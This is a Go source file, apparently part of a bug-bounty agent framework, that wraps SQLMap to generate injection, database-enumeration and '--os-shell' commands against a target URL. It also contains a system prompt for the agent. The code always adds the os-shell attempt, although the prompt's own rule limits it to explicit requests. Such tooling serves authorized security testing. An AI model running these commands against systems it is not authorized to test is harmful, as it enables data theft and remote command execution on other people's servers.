// Package sqlmap implements the SQLMap wrapper agent.
// Intelligently wraps the SQLMap binary with technique hinting
// based on the consolidation agent's classification.
package sqlmap

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "SQLMap Agent" }
func (a *Agent) ID() string           { return "sqlmap" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	// Build SQLMap command with intelligent hints
	commands := generateCommands(targetURL, vulnContext)

	var findings []*base.Finding
	for _, cmd := range commands {
		findings = append(findings, &base.Finding{
			Type:       "SQLMap",
			URL:        targetURL,
			Payload:    cmd.command,
			Severity:   "high",
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"technique": cmd.technique,
				"risk":      cmd.risk,
				"level":     cmd.level,
			},
			Method: cmd.method,
		})
	}
	return findings, nil
}

type sqlmapCommand struct {
	command   string
	technique string
	risk      int
	level     int
	method    string
}

func generateCommands(target, vulnCtx string) []sqlmapCommand {
	ctx := strings.ToLower(vulnCtx)
	var commands []sqlmapCommand

	// Basic detection
	commands = append(commands, sqlmapCommand{
		command:   fmt.Sprintf("sqlmap -u '%s' --batch --level=1 --risk=1", target),
		technique: "basic_detection",
		risk:      1, level: 1,
		method: "GET",
	})

	// Aggressive detection
	commands = append(commands, sqlmapCommand{
		command:   fmt.Sprintf("sqlmap -u '%s' --batch --level=3 --risk=2 --technique=BEUSTQ", target),
		technique: "aggressive_detection",
		risk:      2, level: 3,
		method: "GET",
	})

	// Database enumeration
	commands = append(commands, sqlmapCommand{
		command:   fmt.Sprintf("sqlmap -u '%s' --batch --dbs", target),
		technique: "db_enumeration",
		risk:      1, level: 1,
		method: "GET",
	})

	// DBMS-specific
	if strings.Contains(ctx, "mysql") {
		commands = append(commands, sqlmapCommand{
			command:   fmt.Sprintf("sqlmap -u '%s' --batch --dbms=mysql --technique=BEU", target),
			technique: "mysql_specific",
			risk:      1, level: 2,
			method: "GET",
		})
	}
	if strings.Contains(ctx, "postgres") {
		commands = append(commands, sqlmapCommand{
			command:   fmt.Sprintf("sqlmap -u '%s' --batch --dbms=postgresql --technique=BEU", target),
			technique: "postgres_specific",
			risk:      1, level: 2,
			method: "GET",
		})
	}

	// POST-based if context suggests forms
	if strings.Contains(ctx, "post") || strings.Contains(ctx, "form") {
		commands = append(commands, sqlmapCommand{
			command:   fmt.Sprintf("sqlmap -u '%s' --batch --data='param=value' --level=3 --risk=2", target),
			technique: "post_injection",
			risk:      2, level: 3,
			method: "POST",
		})
	}

	// OS shell (high risk)
	commands = append(commands, sqlmapCommand{
		command:   fmt.Sprintf("sqlmap -u '%s' --batch --os-shell", target),
		technique: "os_shell",
		risk:      3, level: 5,
		method: "GET",
	})

	return commands
}

const defaultSystemPrompt = `You are a SQLMap wrapper agent:
- Build intelligent sqlmap commands based on context from the consolidation agent
- Start with low risk/level, escalate if initial detection fails
- Hint DBMS type when known (--dbms=mysql/postgres/mssql)
- Use appropriate techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
- Parse SQLMap JSON output and convert to findings
- Risk levels: 1=safe, 2=moderate, 3=aggressive (os-shell)

RULES:
1. Always use --batch for non-interactive mode
2. Start with level=1 risk=1, escalate if needed
3. DBMS-specific commands when database type is known
4. os-shell attempts only when explicitly requested (high risk)`
